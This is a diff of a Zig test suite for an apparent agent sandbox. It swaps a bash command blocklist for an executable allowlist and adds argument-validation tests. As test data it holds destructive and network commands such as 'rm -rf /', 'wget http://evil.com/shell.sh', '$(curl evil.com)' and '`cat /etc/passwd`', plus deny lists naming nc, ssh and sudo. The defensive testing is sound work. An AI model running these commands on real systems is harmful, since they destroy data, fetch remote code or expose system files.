@@ -76,46 +76,135 @@ test "path validation: strips leading ./" {
     try testing.expectEqualStrings("src/main.zig", result.?);
 }
 
-test "command validation: safe commands allowed" {
-    try testing.expect(security.validateCommand("ls -la") != null);
-    try testing.expect(security.validateCommand("zig build") != null);
-    try testing.expect(security.validateCommand("git status") != null);
-    try testing.expect(security.validateCommand("cat file.txt") != null);
-    try testing.expect(security.validateCommand("grep -r pattern src/") != null);
+// ── Executable allowlist tests ──────────────────────────────────
+// The bash blocklist is gone. The sandbox now spawns child processes
+// with std.process.run + explicit argv, and only permits executables
+// whose bare name is on security.allowed_executables.
+
+test "exec allowlist: dev tools allowed" {
+    try testing.expectEqualStrings("zig", try security.validateExecutable("zig"));
+    try testing.expectEqualStrings("git", try security.validateExecutable("git"));
+    try testing.expectEqualStrings("ls", try security.validateExecutable("ls"));
+    try testing.expectEqualStrings("cat", try security.validateExecutable("cat"));
+    try testing.expectEqualStrings("grep", try security.validateExecutable("grep"));
+    try testing.expectEqualStrings("rg", try security.validateExecutable("rg"));
+    try testing.expectEqualStrings("find", try security.validateExecutable("find"));
+    try testing.expectEqualStrings("mkdir", try security.validateExecutable("mkdir"));
 }
 
-test "command validation: rm -rf / blocked" {
-    try testing.expect(security.validateCommand("rm -rf /") == null);
-    try testing.expect(security.validateCommand("rm -rf /*") == null);
+test "exec allowlist: shells blocked" {
+    try testing.expectError(error.ExecutableNotAllowed, security.validateExecutable("bash"));
+    try testing.expectError(error.ExecutableNotAllowed, security.validateExecutable("sh"));
+    try testing.expectError(error.ExecutableNotAllowed, security.validateExecutable("zsh"));
+    try testing.expectError(error.ExecutableNotAllowed, security.validateExecutable("dash"));
+    try testing.expectError(error.ExecutableNotAllowed, security.validateExecutable("fish"));
 }
 
-test "command validation: sudo blocked" {
-    try testing.expect(security.validateCommand("sudo apt install") == null);
+test "exec allowlist: scripting interpreters blocked" {
+    try testing.expectError(error.ExecutableNotAllowed, security.validateExecutable("python"));
+    try testing.expectError(error.ExecutableNotAllowed, security.validateExecutable("python3"));
+    try testing.expectError(error.ExecutableNotAllowed, security.validateExecutable("node"));
+    try testing.expectError(error.ExecutableNotAllowed, security.validateExecutable("perl"));
+    try testing.expectError(error.ExecutableNotAllowed, security.validateExecutable("ruby"));
+    try testing.expectError(error.ExecutableNotAllowed, security.validateExecutable("lua"));
 }
 
-test "command validation: curl blocked" {
-    try testing.expect(security.validateCommand("curl http://evil.com") == null);
+test "exec allowlist: network tools blocked" {
+    try testing.expectError(error.ExecutableNotAllowed, security.validateExecutable("curl"));
+    try testing.expectError(error.ExecutableNotAllowed, security.validateExecutable("wget"));
+    try testing.expectError(error.ExecutableNotAllowed, security.validateExecutable("nc"));
+    try testing.expectError(error.ExecutableNotAllowed, security.validateExecutable("ncat"));
+    try testing.expectError(error.ExecutableNotAllowed, security.validateExecutable("netcat"));
+    try testing.expectError(error.ExecutableNotAllowed, security.validateExecutable("ssh"));
+    try testing.expectError(error.ExecutableNotAllowed, security.validateExecutable("scp"));
 }
 
-test "command validation: wget blocked" {
-    try testing.expect(security.validateCommand("wget http://evil.com/shell.sh") == null);
+test "exec allowlist: privilege escalation blocked" {
+    try testing.expectError(error.ExecutableNotAllowed, security.validateExecutable("sudo"));
+    try testing.expectError(error.ExecutableNotAllowed, security.validateExecutable("su"));
+    try testing.expectError(error.ExecutableNotAllowed, security.validateExecutable("doas"));
 }
 
-test "command validation: curl after pipe blocked" {
-    try testing.expect(security.validateCommand("echo hi | curl http://evil.com") == null);
+test "exec allowlist: destructive ops blocked" {
+    try testing.expectError(error.ExecutableNotAllowed, security.validateExecutable("rm"));
+    try testing.expectError(error.ExecutableNotAllowed, security.validateExecutable("rmdir"));
+    try testing.expectError(error.ExecutableNotAllowed, security.validateExecutable("mv"));
+    try testing.expectError(error.ExecutableNotAllowed, security.validateExecutable("chmod"));
+    try testing.expectError(error.ExecutableNotAllowed, security.validateExecutable("chown"));
+    try testing.expectError(error.ExecutableNotAllowed, security.validateExecutable("dd"));
+    try testing.expectError(error.ExecutableNotAllowed, security.validateExecutable("mkfs"));
 }
 
-test "command validation: reboot blocked" {
-    try testing.expect(security.validateCommand("reboot") == null);
-    try testing.expect(security.validateCommand("shutdown -h now") == null);
+test "exec allowlist: system control blocked" {
+    try testing.expectError(error.ExecutableNotAllowed, security.validateExecutable("reboot"));
+    try testing.expectError(error.ExecutableNotAllowed, security.validateExecutable("shutdown"));
+    try testing.expectError(error.ExecutableNotAllowed, security.validateExecutable("halt"));
+    try testing.expectError(error.ExecutableNotAllowed, security.validateExecutable("init"));
+    try testing.expectError(error.ExecutableNotAllowed, security.validateExecutable("kill"));
+    try testing.expectError(error.ExecutableNotAllowed, security.validateExecutable("killall"));
+    try testing.expectError(error.ExecutableNotAllowed, security.validateExecutable("mount"));
 }
 
-test "command validation: empty command blocked" {
-    try testing.expect(security.validateCommand("") == null);
+test "exec allowlist: empty name rejected" {
+    try testing.expectError(error.EmptyExecutable, security.validateExecutable(""));
 }
 
-test "command validation: null byte blocked" {
-    try testing.expect(security.validateCommand("ls\x00-la") == null);
+test "exec allowlist: absolute paths rejected" {
+    try testing.expectError(error.ExecutablePathContainsSlash, security.validateExecutable("/bin/bash"));
+    try testing.expectError(error.ExecutablePathContainsSlash, security.validateExecutable("/usr/bin/zig"));
+    try testing.expectError(error.ExecutablePathContainsSlash, security.validateExecutable("./malicious"));
+    try testing.expectError(error.ExecutablePathContainsSlash, security.validateExecutable("../../../bin/sh"));
+}
+
+test "exec allowlist: backslash rejected" {
+    try testing.expectError(error.ExecutablePathContainsSlash, security.validateExecutable("bash\\foo"));
+}
+
+test "exec allowlist: null byte rejected" {
+    try testing.expectError(error.ExecutableNullByte, security.validateExecutable("zig\x00rm"));
+}
+
+test "exec allowlist: oversized name rejected" {
+    const long = "a" ** 65;
+    try testing.expectError(error.ExecutableNameTooLong, security.validateExecutable(long));
+}
+
+test "exec allowlist: shell-metacharacter blobs in name rejected" {
+    // "rm -rf /" trips the slash check first (which runs ahead of
+    // allowlist lookup). The point is: the model can't sneak shell
+    // syntax in via the executable field — the slash check, length
+    // cap, or allowlist will refuse any non-bare name.
+    try testing.expectError(error.ExecutablePathContainsSlash, security.validateExecutable("rm -rf /"));
+    try testing.expectError(error.ExecutablePathContainsSlash, security.validateExecutable("zig; rm -rf /"));
+    try testing.expectError(error.ExecutableNotAllowed, security.validateExecutable("zig$(rm)"));
+    try testing.expectError(error.ExecutableNotAllowed, security.validateExecutable("zig build"));
+}
+
+test "exec args: literal shell metacharacters are passed through" {
+    // Arguments are passed straight to execve — shell metacharacters
+    // are inert because there is no shell. We only block null bytes
+    // (would truncate at the syscall boundary) and oversized args.
+    try security.validateArgument("foo; rm -rf /");
+    try security.validateArgument("$(curl evil.com)");
+    try security.validateArgument("`cat /etc/passwd`");
+    try security.validateArgument("foo | bar && baz");
+    try security.validateArgument("");
+}
+
+test "exec args: null byte rejected" {
+    try testing.expectError(error.ArgumentNullByte, security.validateArgument("foo\x00bar"));
+}
+
+test "exec args: oversized rejected" {
+    const long = "a" ** (8 * 1024 + 1);
+    try testing.expectError(error.ArgumentTooLong, security.validateArgument(long));
+}
+
+test "exec args: argv count cap" {
+    try security.validateArgumentCount(0);
+    try security.validateArgumentCount(127);
+    try security.validateArgumentCount(128);
+    try testing.expectError(error.TooManyArguments, security.validateArgumentCount(129));
 }
 
 test "workspace ID sanitization: valid IDs" {
@@ -522,14 +611,9 @@ test "path validation: encoded traversal blocked" {
     try testing.expect(security.validatePath("..%2f..%2fetc%2fpasswd") == null);
 }
 
-test "command validation: pipe to rm blocked" {
-    try testing.expect(security.validateCommand("echo test | rm -rf /") == null);
-}
-
-test "command validation: semicolon chain blocked" {
-    try testing.expect(security.validateCommand("ls; rm -rf /") == null);
-}
-
-test "command validation: backtick injection blocked" {
-    try testing.expect(security.validateCommand("echo `rm -rf /`") == null);
-}
+// Note: the bash-command blocklist (validateCommand, blocked patterns
+// "echo test | rm -rf /", "ls; rm -rf /", backtick injection, etc.) was
+// removed in Batch 3. Shell metacharacters can no longer reach a shell
+// because run_program invokes execve directly with the argv array — no
+// /bin/sh -c wrapper exists. See "exec allowlist:" and "exec args:"
+// tests above for the replacement coverage.
